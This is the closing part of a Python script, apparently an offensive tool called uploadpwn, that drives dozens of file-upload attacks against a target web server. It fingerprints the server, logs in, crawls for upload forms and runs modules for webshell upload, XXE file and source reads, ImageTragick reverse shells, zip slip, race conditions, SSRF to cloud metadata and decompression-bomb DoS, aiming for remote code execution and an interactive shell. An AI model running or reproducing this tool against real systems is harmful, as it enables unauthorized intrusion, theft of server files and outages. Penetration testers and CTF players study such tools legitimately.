    mod_group.add_argument("--apache-unrecognized", action="store_true",
                           help="Apache unrecognized extension bypass (.php.foobar)")
    mod_group.add_argument("--ssrf-metadata", action="store_true",
                           help="SSRF via SVG upload → cloud metadata")
    mod_group.add_argument("--ghostscript", action="store_true",
                           help="Ghostscript RCE via EPS/PS upload")
    mod_group.add_argument("--htaccess-race", action="store_true",
                           help="Parallel .htaccess + shell race condition")
    mod_group.add_argument("--filter-matrix", action="store_true",
                           help="Run full FilterMatrix instead of FilterProbe")

    # ── Output ────────────────────────────────────────────────────────────────
    out_group = ap.add_argument_group(f"{B}Output{W}")
    out_group.add_argument("--walkthrough", action="store_true",
                           help="Print full attack walkthrough with one-liners")
    out_group.add_argument("--interactive", action="store_true",
                           help="Drop into webshell on RCE")
    out_group.add_argument("-v", "--verbose", action="count", default=0,
                           help="Increase verbosity (-v, -vv, -vvv)")
    out_group.add_argument("-q", "--quiet", action="store_true",
                           help="Quiet mode — only show findings")
    out_group.add_argument("-o", "--output", default="uploadpwn_report.json",
                           help="Report output file")
    out_group.add_argument("--no-interact", action="store_true",
                           help="Disable human-in-the-loop prompts (use defaults)")
    out_group.add_argument("--crawl-depth", type=int, default=2,
                           help="Max crawl depth for SmartRecon page discovery (default: 2)")
    out_group.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    out_group.add_argument("--timeout", type=int, default=15,
                           help="Request timeout in seconds")
    out_group.add_argument("--threads", type=int, default=5,
                           help="Number of threads")
    out_group.add_argument("--delay", type=float, default=0,
                           help="Delay between requests (seconds)")

    args = ap.parse_args()

    # Set verbosity
    if args.quiet:
        VERBOSITY = 0
    else:
        VERBOSITY = 1 + args.verbose

    # Walkthrough mode
    if args.walkthrough:
        ep = args.endpoint or "/upload.php"
        fld = args.field or "uploadFile"
        print_walkthrough(args.target.rstrip("/"), ep, fld)
        return

    target = args.target.rstrip("/")
    creds = {"username": args.user, "password": args.password} \
            if args.user and args.password else None

    # ── Build session ─────────────────────────────────────────────────────────
    d = Discovery(target, args.output)

    sm = SessionManager(
        target=target,
        login_url=(target + args.login) if args.login else None,
        creds=creds,
        nav_url=args.nav_url,
        upload_page=args.upload_page,
        user_field=args.user_field,
        pass_field=args.pass_field,
        extra_headers=args.headers,
        extra_cookies=args.cookies,
        proxy=args.proxy,
        timeout=args.timeout,
        disc=d,
    )

    # ── Fingerprint ───────────────────────────────────────────────────────────
    server_info = sm.fingerprint()

    if not server_info and not args.endpoint:
        fail("Cannot connect to target — aborting. Check the URL and try again.")
        fail("If the target is behind a VPN, ensure you're connected first.")
        sys.exit(1)
    elif not server_info:
        warn("Fingerprint failed but --endpoint specified — continuing blind")

    # Auto-detect server type from fingerprint + endpoint + page content
    server_type = args.server_type
    if server_type == "all":
        techs = server_info.get("technologies", [])
        # Check headers first
        if "ASP.NET/IIS" in techs:
            server_type = "asp"
            info("Auto-detected: ASP.NET/IIS — focusing on ASP payloads")
        elif "Java" in techs:
            server_type = "jsp"
            info("Auto-detected: Java — focusing on JSP payloads")
        elif "ColdFusion" in techs:
            server_type = "cf"
            info("Auto-detected: ColdFusion — focusing on CFM payloads")
        elif "PHP" in techs:
            server_type = "php"
            info("Auto-detected: PHP — focusing on PHP payloads")

        # If still "all", check endpoint extension and page content
        if server_type == "all":
            ep = args.endpoint or ""
            page_url = target + "/"
            # Check endpoint extension
            if any(ep.lower().endswith(e) for e in [".php", ".phtml", ".php5"]):
                server_type = "php"
                info("Auto-detected: PHP (from endpoint extension)")
            elif any(ep.lower().endswith(e) for e in [".asp", ".aspx"]):
                server_type = "asp"
                info("Auto-detected: ASP (from endpoint extension)")
            elif any(ep.lower().endswith(e) for e in [".jsp", ".jspx"]):
                server_type = "jsp"
                info("Auto-detected: JSP (from endpoint extension)")
            elif any(ep.lower().endswith(e) for e in [".cfm", ".cfc"]):
                server_type = "cf"
                info("Auto-detected: ColdFusion (from endpoint extension)")
            else:
                # Check page content for PHP hints
                try:
                    pr = sm.session.get(page_url, timeout=10)
                    body = pr.text.lower()
                    if ".php" in body or "php" in pr.headers.get("Set-Cookie", "").lower():
                        server_type = "php"
                        info("Auto-detected: PHP (from page content/cookies)")
                    elif ".asp" in body or "asp.net" in body:
                        server_type = "asp"
                        info("Auto-detected: ASP (from page content)")
                    elif ".jsp" in body or "jsessionid" in pr.headers.get("Set-Cookie", "").lower():
                        server_type = "jsp"
                        info("Auto-detected: JSP (from page content/cookies)")
                except:
                    pass

    # ── Login ─────────────────────────────────────────────────────────────────
    if args.login and creds:
        sm.login(method=args.login_method)
        sm.navigate()
    elif args.cookies or args.headers:
        info("Using provided cookies/headers")
    else:
        info("No auth configured — unauthenticated scan")

    # ── Auto-detect upload endpoint ───────────────────────────────────────────
    upload_endpoint = args.endpoint
    upload_field = args.field
    hitl = HumanInTheLoop(enabled=not args.no_interact)

    # SmartRecon: crawl + JS analysis when --smart and no explicit endpoint
    if args.smart and not upload_endpoint:
        info("SmartRecon — crawling target for upload surfaces...")
        recon = SmartRecon(sm, hitl, max_depth=args.crawl_depth)
        targets = recon.discover(target)
        if targets:
            chosen = targets[0]
            upload_endpoint = chosen.endpoint_url
            if not upload_field:
                upload_field = chosen.field_name
            ok(f"SmartRecon found endpoint: {upload_endpoint} (field: {upload_field}, method: {chosen.method})")
            if len(targets) > 1:
                info(f"  ({len(targets)} total upload surfaces found)")
        else:
            warn("SmartRecon found no upload surfaces — falling back to legacy detection")

    if not upload_endpoint:
        found_ep = sm.find_upload_endpoint()
        upload_endpoint = found_ep or None
        if found_ep:
            ok(f"Endpoint: {upload_endpoint}")
        else:
            # HumanInTheLoop fallback
            upload_endpoint = hitl.ask_endpoint()
            if not upload_endpoint:
                upload_endpoint = "/upload.php"
                warn(f"Endpoint not detected — using: {upload_endpoint}")

    # Re-check server type from discovered endpoint if still "all"
    if server_type == "all" and upload_endpoint:
        ep_lower = upload_endpoint.lower()
        if ".php" in ep_lower:
            server_type = "php"
            info("Auto-detected: PHP (from discovered upload endpoint)")
        elif ".asp" in ep_lower:
            server_type = "asp"
            info("Auto-detected: ASP (from discovered upload endpoint)")
        elif ".jsp" in ep_lower:
            server_type = "jsp"
            info("Auto-detected: JSP (from discovered upload endpoint)")

    if not upload_field:
        found_field = sm.find_upload_field()
        upload_field = found_field or None
        if found_field:
            ok(f"Field: {upload_field}")
        else:
            upload_field = hitl.ask_field()
            if not upload_field:
                upload_field = "uploadFile"
                warn(f"Field not detected — using: {upload_field}")

    upload_url = target + upload_endpoint if not upload_endpoint.startswith("http") \
                 else upload_endpoint

    shell_dirs = args.shell_dirs if args.shell_dirs else list(DEFAULT_SHELL_DIRS)

    # ── Build attacker ────────────────────────────────────────────────────────
    atk = UploadAttacker(
        sm=sm, upload_url=upload_url, shell_dirs=shell_dirs,
        cmd_param=args.cmd_param, field=upload_field,
        flag_path=args.flag, verbose=args.verbose,
        disc=d, interactive=args.interactive,
        threads=args.threads, delay=args.delay,
        server_type=server_type,
    )

    print(f"""
{B}{BOLD}  ┌─────────────────────────────────────────────────────────┐
  │  Target     : {target[:43]:<43}│
  │  Upload URL : {upload_url[:43]:<43}│
  │  Field      : {upload_field[:43]:<43}│
  │  Server     : {server_type[:43]:<43}│
  │  Shell dirs : {str(len(atk.shell_dirs)) + ' paths':<43}│
  │  Threads    : {str(args.threads):<43}│
  │  Report     : {args.output[:43]:<43}│
  └─────────────────────────────────────────────────────────┘{W}
""")

    # ── Filter fingerprint ────────────────────────────────────────────────────
    probe_results = {}
    if not args.no_probe:
        probe = FilterProbe(atk.upload, d, upload_field)
        probe_results = probe.probe_all()

    run_all = args.all

    # ── Auto-mode: if user specified NO module flags at all, run smart+all ──
    _any_module = any([
        args.smart, args.all, args.ext_fuzz, args.matrix, args.htaccess,
        args.webconfig, args.svg_read, args.svg_src, args.svg_xss, args.svg_ssrf,
        args.race, args.zip, args.symlink_zip, args.war, args.imagetragick,
        args.polyglot, args.raw_null, args.chunked, args.lfi, args.error_disclose,
        args.iis_semicolon, args.char_inject, args.boundary, args.dos,
        args.discover, args.dir_enum, args.filename_inject, args.exif_xss,
        args.docx_xxe, args.xlsx_xxe, args.bomb, args.pixel_flood, args.win83,
        args.filter_matrix, args.walkthrough,
    ])
    if not _any_module:
        info("No modules specified — running smart mode with full coverage")
        args.smart = True
        run_all = True
        args.all = True

    # ── Smart mode — auto-pick best attacks based on probes ──────────────────
    if args.smart:
        info("Smart mode enabled — auto-selecting best attack strategy")
        pr = probe_results if not args.no_probe else {}

        # Run FilterMatrix if requested (replaces FilterProbe results)
        if args.filter_matrix:
            info("Running FilterMatrix — systematic combinatorial filter testing...")
            fm = FilterMatrix(atk.upload, d, upload_field)
            matrix_results = fm.fuzz_and_analyze()
            if matrix_results.get("optimal_combos"):
                ok(f"FilterMatrix found {len(matrix_results['optimal_combos'])} working combos")
                pr["filter_matrix"] = matrix_results

        # Run discovery + dir enum first to expand shell_dirs
        atk.discover_all(sm.upload_page)
        atk.attack_dir_enum(args.wordlist)
        atk.attack_error_disclosure()

        # SVG XXE — try file read AND source read if SVG is allowed
        xxe_flag_content = None
        source_analysis = None
        if pr.get("svg_allowed"):
            xxe_flag_content = atk.attack_svg_xxe_read(args.svg_read or args.flag)

            # Try to read upload source code to discover filters
            # Build comprehensive list based on discovered endpoint
            upload_sources = [args.svg_src] if args.svg_src else []
            # Derive from the upload endpoint path
            ep_path = urlparse(upload_endpoint).path if upload_endpoint else ""
            if ep_path and ep_path.endswith(".php"):
                ep_basename = os.path.basename(ep_path)
                ep_dir = os.path.dirname(ep_path).lstrip("/")
                if ep_basename not in upload_sources:
                    upload_sources.insert(0, ep_basename)
                if ep_path.lstrip("/") not in upload_sources:
                    upload_sources.insert(0, ep_path.lstrip("/"))
            upload_sources.extend([
                "upload.php", "file_upload.php",
                "contact/upload.php", "contact/submit.php",
                "contact/file_upload.php",
                "upload_handler.php", "submit.php",
                "includes/upload.php", "lib/upload.php",
            ])
            # Deduplicate while preserving order
            upload_sources = list(dict.fromkeys(upload_sources))
            src_content = None
            for src_file in upload_sources:
                src_content = atk.attack_svg_xxe_source(src_file)
                if src_content and ('$_FILES' in src_content or 'move_uploaded_file' in src_content
                                    or 'preg_match' in src_content):
                    ok(f"Got real PHP source from {src_file}!")
                    source_analysis = atk.analyze_source_filters(src_content)
                    # Add discovered upload dir to shell_dirs
                    if source_analysis and source_analysis.get("upload_dir"):
                        ud = source_analysis["upload_dir"]
                        # Also try relative to the upload endpoint's directory
                        ep_dir_path = os.path.dirname(urlparse(upload_endpoint).path) if upload_endpoint else ""
                        dirs_to_add = [ud]
                        if ep_dir_path and ud.startswith("/"):
                            relative_ud = ep_dir_path + ud
                            dirs_to_add.append(relative_ud)
                        for _dir in dirs_to_add:
                            if not _dir.endswith("/"):
                                _dir += "/"
                            if _dir not in atk.shell_dirs:
                                atk.shell_dirs.insert(0, _dir)
                                ok(f"Added upload dir to search: {_dir}")
                    break

            if xxe_flag_content:
                ok("File read via XXE succeeded — also attempting RCE for full shell...")

        # Pass source analysis to smart attack for targeted bypass
        if source_analysis:
            pr["source_analysis"] = source_analysis
            if source_analysis.get("rename_pattern"):
                atk._rename_pattern = source_analysis["rename_pattern"]

        # Run the smart attack engine (always tries for RCE)
        atk.smart_attack(pr, run_all=True, args=args)

        # Report and exit
        d.print_report()
        d.save()
        return

    # ── Run modules ───────────────────────────────────────────────────────────
    # Discovery first
    if args.discover or run_all:
        atk.discover_all(sm.upload_page)

    if args.dir_enum or run_all:
        atk.attack_dir_enum(args.wordlist)

    # Error disclosure early (adds to shell_dirs)
    if args.error_disclose or run_all:
        atk.attack_error_disclosure()

    # SVG attacks
    if args.svg_read or run_all:
        atk.attack_svg_xxe_read(args.svg_read or args.flag)

    if args.svg_src or run_all:
        atk.attack_svg_xxe_source(args.svg_src or "upload.php")

    if args.svg_xss or run_all:
        atk.attack_svg_xss()

    if args.svg_ssrf:
        atk.attack_svg_ssrf(args.svg_ssrf)

    # Config file attacks
    if args.htaccess or run_all:
        if not atk.rce_found:
            atk.attack_htaccess()

    if args.webconfig or run_all:
        if not atk.rce_found:
            atk.attack_webconfig()

    # Polyglot attacks
    if args.polyglot or run_all:
        if not atk.rce_found:
            atk.attack_png_polyglot()
        if not atk.rce_found:
            atk.attack_jpeg_polyglot()
        if not atk.rce_found:
            atk.attack_gif_polyglot()

    # Advanced bypass techniques
    if args.raw_null or run_all:
        if not atk.rce_found:
            atk.attack_raw_null_byte()

    if args.chunked or run_all:
        if not atk.rce_found:
            atk.attack_chunked()

    if args.boundary or run_all:
        if not atk.rce_found:
            atk.attack_boundary_confusion()

    if args.char_inject or run_all:
        if not atk.rce_found:
            atk.attack_char_injection()

    if args.iis_semicolon or run_all:
        if not atk.rce_found:
            atk.attack_iis_semicolon()

    # Server-specific
    if args.war or run_all:
        if not atk.rce_found:
            atk.attack_war_deploy()

    # Archive attacks
    if args.zip or run_all:
        if not atk.rce_found:
            atk.attack_zip_slip()

    if args.symlink_zip:
        atk.attack_symlink_zip(args.symlink_zip)
    elif run_all:
        atk.attack_symlink_zip("/etc/passwd")

    # ImageTragick
    if args.imagetragick or run_all:
        atk.attack_imagetragick(
            read_file=args.imagetragick_read,
            revshell=args.imagetragick_revshell,
        )

    # Race condition
    if args.race or run_all:
        if not atk.rce_found:
            atk.attack_race()

    # LFI chaining (last resort for non-accessible upload dirs)
    if args.lfi or run_all:
        if not atk.rce_found:
            atk.attack_lfi_chain()

    # Extension execution fuzz (the HTB approach)
    if args.ext_fuzz or run_all:
        if not atk.rce_found:
            atk.attack_ext_execute_fuzz()

    # Main matrix (runs if nothing else found)
    if not atk.rce_found:
        if args.matrix or run_all or not any([
            args.htaccess, args.webconfig, args.svg_read, args.svg_src,
            args.svg_xss, args.svg_ssrf, args.race, args.zip, args.war,
            args.imagetragick, args.polyglot, args.raw_null, args.chunked,
            args.lfi, args.error_disclose, args.iis_semicolon,
            args.boundary, args.char_inject, args.ext_fuzz, args.symlink_zip,
            args.dos, args.discover, args.dir_enum,
            args.filename_inject, args.exif_xss, args.docx_xxe, args.xlsx_xxe,
            args.bomb, args.pixel_flood, args.win83,
            args.userini, args.ssi, args.path_traversal, args.unicode,
            args.put_upload, args.stored_xss, args.cgi, args.double_cd,
            args.phar_deser, args.phpfpm_pathinfo, args.multipart_pollute,
            args.cte_base64, args.path_truncation, args.apache_unrecognized,
            args.ssrf_metadata, args.ghostscript, args.htaccess_race,
        ]):
            atk.attack_matrix()

    # ── v7.0 new attack modules ─────────────────────────────────────────────
    if args.filename_inject or run_all:
        if not atk.rce_found:
            atk.attack_filename_injection()

    if args.exif_xss or run_all:
        atk.attack_exif_xss()

    if args.docx_xxe or run_all:
        atk.attack_document_xxe(args.docx_xxe or args.flag, "docx")

    if args.xlsx_xxe or run_all:
        atk.attack_document_xxe(args.xlsx_xxe or args.flag, "xlsx")

    if args.win83 or run_all:
        if not atk.rce_found:
            atk.attack_win83_shortname()

    # DoS / resource exhaustion (last)
    if args.bomb or run_all:
        atk.attack_decompression_bomb()

    if args.pixel_flood or run_all:
        atk.attack_pixel_flood()

    # v7.0 — config/traversal/injection modules
    if args.userini or run_all:
        if not atk.rce_found:
            atk.attack_userini()

    if args.ssi or run_all:
        if not atk.rce_found:
            atk.attack_ssi()

    if args.path_traversal or run_all:
        if not atk.rce_found:
            atk.attack_path_traversal()

    if args.unicode or run_all:
        if not atk.rce_found:
            atk.attack_unicode_norm()

    if args.put_upload or run_all:
        if not atk.rce_found:
            atk.attack_put_method()

    if args.cgi or run_all:
        if not atk.rce_found:
            atk.attack_cgi_upload()

    if args.double_cd or run_all:
        if not atk.rce_found:
            atk.attack_double_content_disposition()

    if args.phar_deser or run_all:
        if not atk.rce_found:
            atk.attack_phar_deser()

    if args.stored_xss or run_all:
        atk.attack_stored_xss()

    # v7.0 — protocol-level and server-specific
    if args.phpfpm_pathinfo or run_all:
        if not atk.rce_found:
            atk.attack_phpfpm_pathinfo()

    if args.multipart_pollute or run_all:
        if not atk.rce_found:
            atk.attack_multipart_pollution()

    if args.cte_base64 or run_all:
        if not atk.rce_found:
            atk.attack_cte_base64()

    if args.path_truncation or run_all:
        if not atk.rce_found:
            atk.attack_path_truncation()

    if args.apache_unrecognized or run_all:
        if not atk.rce_found:
            atk.attack_apache_unrecognized_ext()

    if args.ghostscript or run_all:
        if not atk.rce_found:
            atk.attack_ghostscript()

    if args.htaccess_race or run_all:
        if not atk.rce_found:
            atk.attack_htaccess_race()

    if args.ssrf_metadata or run_all:
        atk.attack_ssrf_metadata()

    if args.dos or run_all:
        atk.attack_dos_probe()

    # ── Report ────────────────────────────────────────────────────────────────
    d.print_report()
    d.save()


if __name__ == "__main__":
    main()
